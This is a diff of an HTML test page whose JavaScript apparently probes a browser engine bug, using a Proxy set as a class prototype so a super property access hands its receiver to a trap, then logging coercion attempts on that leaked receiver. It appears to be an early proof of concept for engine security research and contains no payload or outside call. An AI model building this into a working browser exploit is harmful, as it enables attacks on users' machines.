@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <body>
-<pre id="log"></pre>
+<pre id="out"></pre>
 <script>
 function log(msg) {
-    document.getElementById('log').textContent += msg + '\n';
+    document.getElementById('out').textContent += msg + '\n';
 }
 
 function leakReceiverViaSuperGet() {
@@ -14,40 +14,63 @@ function leakReceiverViaSuperGet() {
         }
     }
 
+    let leakedReceiver = null;
+
     Leaker.prototype.__proto__ = new Proxy({}, {
-        get(target, prop, leakedReceiver) {
+        get(target, prop, receiver) {
             log(`[+] Proxy trap called for property "${prop}"`);
 
+            // Save for external access or debug
+            leakedReceiver = receiver;
+
+            // 🔬 Coercion tests
             try {
-                log(`typeof receiver: ${typeof leakedReceiver}`);
+                log(`typeof receiver: ${typeof receiver}`);
             } catch (e) {
                 log(`typeof threw: ${e.message}`);
             }
 
             try {
-                log(`receiver.constructor: ${leakedReceiver.constructor}`);
+                log(`receiver.constructor: ${receiver.constructor}`);
             } catch (e) {
                 log(`receiver.constructor threw: ${e.message}`);
             }
 
             try {
-                log(`receiver instanceof Object: ${leakedReceiver instanceof Object}`);
+                log(`receiver instanceof Object: ${receiver instanceof Object}`);
             } catch (e) {
                 log(`instanceof threw: ${e.message}`);
             }
 
             try {
-                let keys = Object.keys(leakedReceiver);
-                log(`Object.keys() => ${JSON.stringify(keys)}`);
+                log(`String(receiver): ${String(receiver)}`);
             } catch (e) {
-                log(`Object.keys threw: ${e.message}`);
+                log(`String(receiver) threw: ${e.message}`);
             }
 
             try {
-                let refl = Reflect.ownKeys(leakedReceiver);
-                log(`Reflect.ownKeys() => ${JSON.stringify(refl)}`);
+                log(`receiver + "": ${receiver + ""}`);
             } catch (e) {
-                log(`Reflect.ownKeys threw: ${e.message}`);
+                log(`receiver + "" threw: ${e.message}`);
+            }
+
+            try {
+                log(`receiver == "[object Object]": ${receiver == "[object Object]"}`);
+            } catch (e) {
+                log(`comparison threw: ${e.message}`);
+            }
+
+            try {
+                log(`JSON.stringify(receiver): ${JSON.stringify(receiver)}`);
+            } catch (e) {
+                log(`JSON.stringify threw: ${e.message}`);
+            }
+
+            try {
+                let desc = Object.getOwnPropertyDescriptors(receiver);
+                log(`Object.getOwnPropertyDescriptors: ${JSON.stringify(desc)}`);
+            } catch (e) {
+                log(`Object.getOwnPropertyDescriptors threw: ${e.message}`);
             }
 
             return 0;
@@ -55,7 +78,7 @@ function leakReceiverViaSuperGet() {
     });
 
     const { leak } = Leaker.prototype;
-    leak(); // trigger leak
+    leak(); // Trigger leak
 }
 
 leakReceiverViaSuperGet();
